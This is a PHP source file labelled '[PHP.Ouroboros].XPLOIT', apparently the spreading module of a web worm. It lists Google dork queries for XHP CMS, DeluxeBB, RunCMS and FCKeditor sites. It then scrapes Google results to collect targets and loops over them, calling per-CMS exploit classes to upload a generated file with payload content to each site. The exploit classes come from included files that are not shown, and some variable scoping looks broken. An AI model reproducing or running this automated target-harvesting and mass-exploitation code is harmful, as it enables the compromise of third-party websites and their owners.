<?php

include("DBB.php");
include("fck.php");
include("xhp.php");
include("runcms.php");

/*
[PHP.Ouroboros].XPLOIT
By: Nomenumbra
*/

class Xploit {
    function Sploit($host,$port,$path,$filename,$filecontent){}
}

$dork[0] = "\"Powered by XHP CMS v0.5\"";
$dork[1] = "\"powered by deluxebb\"";
$dork[2] = "\"powered by runcms\"";
$dork[3] = "inurl:fckeditor";
$sploits = array();
$sploits[0] = new xhp();
$sploits[1] = new dbb();
$sploits[2] = new runcms();
$sploits[3] = new fck();

function Google4Targets($host,$search,$num) // google for targets
{
 $query = "/search?as_q=".UrlEncode($search)."&num=".$num."&hl=en";
 $q = "http://".$host.$query;
 $packet ="GET ".$q." HTTP/1.0\r\n";
 $packet.="Host: ".$host."\r\n";
 $packet.="Connection: Close\r\n\r\n";
 $html = sendpacket($host,80,$packet);
 $temp=explode("of about <b>",$html);
 $temp2=explode("</b> for ",$temp[1]);
 $total=$temp2[0];
 $total = str_replace(",","",$total);
 $looplen = $total / $num; 
 for($r = 0; $r < $looplen; $r++)
 {
  $strt = $r * $num;
  $query = "/search?as_q=".UrlEncode($search)."&num=".$num."&hl=en&start=".$strt;
  $q = "http://".$host.$query;
  $packet ="GET ".$q." HTTP/1.0\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Connection: Close\r\n\r\n";
  $html = sendpacket($host,80,$packet);
  
  $temp=explode("<a class=l href=\"",$html);
  for ($i=1; $i<=count($temp)-1; $i++)
  {
    $temp2=explode("\">",$temp[$i]);
    $targets[$targetcount] = $temp2[0];
    $targetcount++;
  }
 }
}

function AutoXploit() // exploit routine
{
  for ($i = 0; $i < count($dork); $i++)
  { 
    $targets = array();
    $targetcount = 0; 
    Google4Targets("www.google.com",$dork[$i],100);
    if ($targetcount > $MAIN['searchlim'])
      $targetcount = $MAIN['searchlim'];
    $randoffset = round(rand(0,$targetcount / 2));
    for ($x = $randoffset; $x < $targetcount; $x++)
    {
      $targets[$x] = eregi_replace("http://", "",$targets[$x]);
      $temp = explode("/",$targets[$x]);
      $base = $temp[0];      
      $extend = "/";
      for($r = 1; $r < count($temp)-1; $r++)
      {
        $extend .= $temp[$r]."/";
      } 
      $MAIN['filename'] = GenFileName();
      $sploits[$i]->Sploit($base,80,$extend,$MAIN['filename'],$MAIN['filecontent']);
    }
  }
}


?>